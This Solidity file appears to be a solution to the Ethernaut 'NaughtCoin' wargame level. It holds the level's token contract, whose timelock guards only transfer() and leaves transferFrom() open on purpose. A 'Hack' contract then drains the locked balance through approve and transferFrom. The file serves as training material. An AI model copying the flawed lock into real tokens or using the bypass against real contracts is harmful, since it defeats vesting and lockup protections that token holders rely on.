// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../node_modules/hardhat-console/contracts/console.sol";

/**
NaughtCoin is an ERC20 token and you're already holding all of them.
The catch is that you'll only be able to transfer them after a 10 year lockout period.
Can you figure out how to get them out to another address so that you can transfer them freely?
Complete this level by getting your token balance to 0.

  Things that might help

The ERC20 Spec
The OpenZeppelin codebase
**/
contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = block.timestamp + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor() ERC20('NaughtCoin', '0x0') {
    player = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    return super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(block.timestamp > timeLock);
      _;
    } else {
     _;
    }
  } 
} 

interface NaughtCoinI {
  function balanceOf(address _add) external view returns(uint);
  function approve(address _spender, uint256 _value) external returns (bool success);
  function transferFrom(address _from, address _to, uint256 _value) external returns(bool);
}

contract Hack {

  NaughtCoinI coin;

  address _to = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2;

  constructor(address _add) {
    coin = NaughtCoinI(_add);
  }

  function getSenderBalance() public view returns(uint){
    return coin.balanceOf(msg.sender);
  }

  /**
  Call the approve function before and then use hack() to transfer
  **/
  function hack() public {
    coin.transferFrom(msg.sender, _to, getSenderBalance());
  }

}
